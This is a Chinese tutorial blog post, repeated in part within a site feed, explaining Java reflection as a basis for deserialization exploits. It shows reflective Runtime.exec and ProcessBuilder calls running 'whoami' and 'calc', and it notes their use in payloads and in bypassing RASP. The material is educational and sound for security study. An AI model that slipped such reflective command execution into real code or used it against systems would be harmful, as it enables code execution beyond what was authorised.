Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Runtime类示例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance,<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(IOUtils.toString(in,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Method2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">mt</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">            mt.invoke(ob,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反射调用Runtime实现本地命令执行的流程如下：</strong></p><ol><li>反射获取<code>Runtime</code>类对象(<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)。</li><li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为Runtime的构造方法是private的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li><li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)。</li><li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li></ol><h2 id="0x03-反射调用类方法"><a href="#0x03-反射调用类方法" class="headerlink" title="0x03 反射调用类方法"></a>0x03 反射调用类方法</h2><p><code>Class</code> 对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法</p><p><strong>获取当前类所有的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = clazz.getDeclaredMethods();</span><br></pre></td></tr></table></figure><p><strong>获取当前类的指定的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>,类型参数如String.class，多个参数用逗号隔开);</span><br></pre></td></tr></table></figure><p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到当前类和父类的所有有权限的方法(如：<strong>public</strong>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)。</p><p><strong>反射调用方法</strong></p><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法</p><p><code>method.invoke</code>的<strong>第一个参数必须是类实例对象</strong>，如果调用的是<code>static</code>方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用。<br><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的依次传入对应的参数类型。</p><h2 id="0x04-反射获取Runtime类执行命令"><a href="#0x04-反射获取Runtime类执行命令" class="headerlink" title="0x04 反射获取Runtime类执行命令"></a>0x04 反射获取Runtime类执行命令</h2><p><a href="https://xz.aliyun.com/t/4711">https://xz.aliyun.com/t/4711</a></p><p> <strong>部分代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> i.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).</span><br><span class="line">                    getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).invoke(<span class="literal">null</span>);</span><br><span class="line">            System.out.println(obj.getClass().getName());</span><br><span class="line">            i.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).</span><br><span class="line">                    invoke(obj,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>getMethod(方法名, 方法类型)<br>invoke(某个对象实例， 传入参数)<br>invoke的作用是执行方法，如果这个参数是一个普通方法，那么第一个参数就是类对象；如果这个方法是一个静态方法，那么第一个参数是类</p></blockquote><h2 id="0x05-反射小问题"><a href="#0x05-反射小问题" class="headerlink" title="0x05 反射小问题"></a>0x05 反射小问题</h2><h3 id="5-1-当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？"><a href="#5-1-当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？" class="headerlink" title="5.1 当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？"></a>5.1 当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？</h3><p>在面对以上问题时，需要用到一个新的反射方法<code>getConstructor</code><br>这个方法和<code>getMethod</code>相似，<code>getConstructor</code>接受的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须使用参数列表类型才能唯一确定一个构造函数。</p><p>在获取到构造函数后，使用<code>newInstance</code>来执行</p><p>ProcessBuilder有两个构造函数：</p><ul><li>public ProcessBuilder(List command) </li><li>public ProcessBuilder(String… command)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);    </span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(            Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)    ));</span><br></pre></td></tr></table></figure><p>上面是使用的第一种，所以在传入的是<code>LIst.class</code>，通过 <code>getMethod(&quot;start&quot;) </code>获取到<code>start</code>方法，然后 <code>invoke</code> 执行， <code>invoke</code> 的第一个参数就是 ProcessBuilder Object了。</p><p>对于第二种构造函数，要怎么使用反射来执行呢？</p><p>这里就又涉及到java里的可变长参数（varargs）了；当定义函数的时候不确定参数数量时，就可以使用<code>...</code>这样的语法来表示这个函数的参数个数是可变的 ；对于可变参长数，java在编译的时候会编译成一个数组。</p><p>那么，对于反射来说，如果要获取的目标函数里包含可变长参数，只要认为它是数组就行了。<br>所以，将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>，就可以获取<code>ProcessBuilder</code>的第二种构造参数了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> </span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);    </span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure><p>在调用<code>newInstance</code>的时候，因为这个函数本身接受的是一个可变长参数，我们在传给<code>ProcessBuilder</code>的也是一个可变长参数，二者叠加为一个二维数组</p><h3 id="5-2-如果一个方法或构造方法是私有方法，我们是否能执行他"><a href="#5-2-如果一个方法或构造方法是私有方法，我们是否能执行他" class="headerlink" title="5.2 如果一个方法或构造方法是私有方法，我们是否能执行他"></a>5.2 如果一个方法或构造方法是私有方法，我们是否能执行他</h3><p>答案是可以，这里可以使用<code>getDeclared</code>系列的反射，</p><ul><li><code>getDeclaredMethod</code>系列的方法获取的是当前类中声明的方法， 是实在写在这个类里的，包括私有方法， 但从父类继承来得就不包含了</li><li><code>getMethod</code>系列方法获取的是当前类中所有公共方法， 包括从父类中继承的方法</li></ul><h2 id="0x06-Java反射机制总结"><a href="#0x06-Java反射机制总结" class="headerlink" title="0x06 Java反射机制总结"></a>0x06 Java反射机制总结</h2><p>java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM</code>框架等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-Reflection-Reflection.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-Reflection-Reflection.md</a></li><li>java安全漫谈</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java反射&quot;&gt;&lt;a href=&quot;#java反射&quot; class=&quot;headerlink&quot; title=&quot;java反射&quot;&gt;&lt;/a&gt;java反射&lt;/h1&gt;&lt;h2 id=&quot;0x00-java反射简介&quot;&gt;&lt;a href=&quot;#0x00-java反射简介&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="JAVA反序列化" scheme="https://theth1nk3r.github.io/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="反射" scheme="https://theth1nk3r.github.io/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化漏洞之反射机制</title>
    <link href="https://theth1nk3r.github.io/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%881%EF%BC%89%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>https://theth1nk3r.github.io/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%881%EF%BC%89%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</id>
    <published>2021-03-09T01:49:00.000Z</published>
    <updated>2022-12-18T12:11:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><h2 id="0x00-java反射简介"><a href="#0x00-java反射简介" class="headerlink" title="0x00 java反射简介"></a>0x00 java反射简介</h2><blockquote><p>反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性，这种动态获取的信息以及动态调用对象的方法的功能称为<strong>java语言的反射机制</strong></p><blockquote><p>将类的各个部分封装为其他对象<br>反射是框架设计的灵魂<br><strong>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值</strong></p></blockquote></blockquote><p>Java 反射主要提供以下功能：</p><ul><li>在运行时判断任意一个对象所属的类；</li><li>在运行时构造任意一个类的对象；</li><li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li><li>在运行时调用任意一个对象的方法</li></ul><p>反射的好处：</p><ol><li>可以在程序运行过程中，操作这些对象</li><li>可以解耦，提高程序的可扩展性</li></ol><h2 id="0x01-获取class对象"><a href="#0x01-获取class对象" class="headerlink" title="0x01 获取class对象"></a>0x01 获取class对象</h2><p>java反射操作的是<code>java.lang.Class</code>对象，有一下方法获取一个类的Class对象：</p><ol><li><code>类名.class</code></li><li><code>Class.forName(&quot;com.demo.classloader.TestClass&quot;)</code> </li><li><code>ClassLoader.loadClass(&quot;com.demo.classLoader.TestClass&quot;)</code></li></ol><p>反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>，如<code>com.org.test</code>类有一个叫做<code>Hello</code>的内部类，则在调用它的时候要写成：<code>com.org.test$Hello</code>。</p><h2 id="0x02-反射java-lang-Runtime"><a href="#0x02-反射java-lang-Runtime" class="headerlink" title="0x02 反射java.lang.Runtime"></a>0x02 反射java.lang.Runtime</h2><p><code>java.lang.Runtime</code>中有一个<code>exec</code>方法可以执行本地命令，在很多<strong>payload</strong>中都能看见反射<strong>Runtime</strong>类来执行本地命令</p><p><strong>不使用反射执行本地命令代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure><p><strong>反射Runtime执行本地命令代码片段：</strong></p><blockquote><p>这里的<code>IOUtils</code>是<code>org.apache.commons.io.IOUtils</code>包下的，需要使用maven导入</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Runtime类示例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance,<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(IOUtils.toString(in,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Method2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">mt</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">            mt.invoke(ob,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反射调用Runtime实现本地命令执行的流程如下：</strong></p><ol><li>反射获取<code>Runtime</code>类对象(<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)。</li><li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为Runtime的构造方法是private的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li><li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)。</li><li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li></ol><h2 id="0x03-反射调用类方法"><a href="#0x03-反射调用类方法" class="headerlink" title="0x03 反射调用类方法"></a>0x03 反射调用类方法</h2><p><code>Class</code> 对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法</p><p><strong>获取当前类所有的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = clazz.getDeclaredMethods();</span><br></pre></td></tr></table></figure><p><strong>获取当前类的指定的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>,类型参数如String.class，多个参数用逗号隔开);</span><br></pre></td></tr></table></figure><p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到当前类和父类的所有有权限的方法(如：<strong>public</strong>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)。</p><p><strong>反射调用方法</strong></p><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法</p><p><code>method.invoke</code>的<strong>第一个参数必须是类实例对象</strong>，如果调用的是<code>static</code>方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用。<br><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的依次传入对应的参数类型。</p><h2 id="0x04-反射获取Runtime类执行命令"><a href="#0x04-反射获取Runtime类执行命令" class="headerlink" title="0x04 反射获取Runtime类执行命令"></a>0x04 反射获取Runtime类执行命令</h2><p><a href="https://xz.aliyun.com/t/4711">https://xz.aliyun.com/t/4711</a></p><p> <strong>部分代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> i.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).</span><br><span class="line">                    getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).invoke(<span class="literal">null</span>);</span><br><span class="line">            System.out.println(obj.getClass().getName());</span><br><span class="line">            i.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).</span><br><span class="line">                    invoke(obj,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>getMethod(方法名, 方法类型)<br>invoke(某个对象实例， 传入参数)<br>invoke的作用是执行方法，如果这个参数是一个普通方法，那么第一个参数就是类对象；如果这个方法是一个静态方法，那么第一个参数是类</p></blockquote><h2 id="0x05-反射小问题"><a href="#0x05-反射小问题" class="headerlink" title="0x05 反射小问题"></a>0x05 反射小问题</h2><h3 id="5-1-当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？"><a href="#5-1-当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？" class="headerlink" title="5.1 当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？"></a>5.1 当一个类没有无参构造放法，也没有类似单例模式里的静态方法时，如何通过反射实例化该类？</h3><p>在面对以上问题时，需要用到一个新的反射方法<code>getConstructor</code><br>这个方法和<code>getMethod</code>相似，<code>getConstructor</code>接受的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须使用参数列表类型才能唯一确定一个构造函数。</p><p>在获取到构造函数后，使用<code>newInstance</code>来执行</p><p>ProcessBuilder有两个构造函数：</p><ul><li>public ProcessBuilder(List command) </li><li>public ProcessBuilder(String… command)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);    </span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(            Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)    ));</span><br></pre></td></tr></table></figure><p>上面是使用的第一种，所以在传入的是<code>LIst.class</code>，通过 <code>getMethod(&quot;start&quot;) </code>获取到<code>start</code>方法，然后 <code>invoke</code> 执行， <code>invoke</code> 的第一个参数就是 